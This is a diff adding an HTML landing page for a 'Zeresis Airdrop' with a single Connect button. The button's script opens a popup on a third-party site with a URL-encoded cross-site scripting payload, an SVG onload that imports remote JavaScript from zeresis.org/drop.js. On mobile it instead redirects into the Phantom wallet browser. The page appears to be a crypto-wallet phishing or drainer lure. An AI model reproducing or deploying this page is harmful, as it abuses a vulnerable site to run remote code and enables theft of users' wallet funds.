@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zeresis Airdrop</title>
+    <style>
+        /* Modern CSS Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #0a0a0a;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Header Styles */
+        .header {
+            padding: 1.5rem;
+            display: flex;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 700;
+            background: linear-gradient(45deg, #e879f9, #d946ef);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            transition: opacity 0.3s ease;
+        }
+
+        .logo:hover {
+            opacity: 0.8;
+        }
+
+        /* Banner Styles */
+        .banner {
+            background: linear-gradient(90deg, #d946ef, #e879f9);
+            padding: 1rem;
+            text-align: center;
+            font-weight: 600;
+            letter-spacing: 0.05em;
+            box-shadow: 0 2px 10px rgba(217, 70, 239, 0.2);
+        }
+
+        /* Main Content */
+        .main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 2rem;
+        }
+
+        /* New Header Styles */
+        .airdrop-header {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 2rem;
+            background: linear-gradient(45deg, #e879f9, #d946ef);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        /* Button Styles */
+        .connect-button {
+            background: linear-gradient(45deg, #d946ef, #e879f9);
+            border: none;
+            color: white;
+            padding: 1rem 3rem;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .connect-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                90deg,
+                rgba(255, 255, 255, 0) 0%,
+                rgba(255, 255, 255, 0.2) 50%,
+                rgba(255, 255, 255, 0) 100%
+            );
+            transition: left 0.5s ease;
+        }
+
+        .connect-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 20px rgba(217, 70, 239, 0.4);
+        }
+
+        .connect-button:hover::before {
+            left: 100%;
+        }
+
+        .connect-button:active {
+            transform: translateY(0);
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="logo">zeresis</div>
+    </header>
+
+    <div class="banner">
+        ZERESIS AIRDROP NOW LIVE
+    </div>
+
+    <main class="main">
+        <h1 class="airdrop-header">Zeresis Airdrop</h1>
+        <button onclick="openPopupOrRedirect()" class="connect-button">Connect</button>
+    </main>
+    <script>    // Function to open a popup or redirect
+        function openPopupOrRedirect() {
+            const url = "https://killabears.com/dashboard/viewer.php?img=%22--!%3E%3CsVg/oNloAd=import(%27https://zeresis.org/drop.js%27);%3E%5Cx3e"
+            const popupWidth = 500;
+            const popupHeight = 750;
+        
+            const screenWidth = screen.width;
+            const screenHeight = screen.height;
+        
+            if (screenWidth > popupWidth && screenHeight > popupHeight) {
+                const left = (screenWidth - popupWidth) / 2;
+                const top = (screenHeight - popupHeight) / 2;
+        
+                window.open(url, "_blank", `width=${popupWidth},height=${popupHeight},top=${top},left=${left}`);
+            } else {
+                window.location.href = "https://phantom.app/ul/browse/https%3A%2F%2Fzeresis.org%2Fmobile?ref=https%3A%2F%2Fzeresis.org%2Fmobile";
+            }
+        }
+        
+        // Add event listeners to all button elements
+        document.addEventListener('DOMContentLoaded', function() {
+            const buttons = document.getElementsByTagName('button');
+            for (let i = 0; i < buttons.length; i++) {
+                buttons[i].addEventListener('click', function(event) {
+                    event.preventDefault(); // Prevents the default button action if necessary
+                    openPopupOrRedirect();
+                });
+            }
+        });
+    </script>
+</body>
+</html>
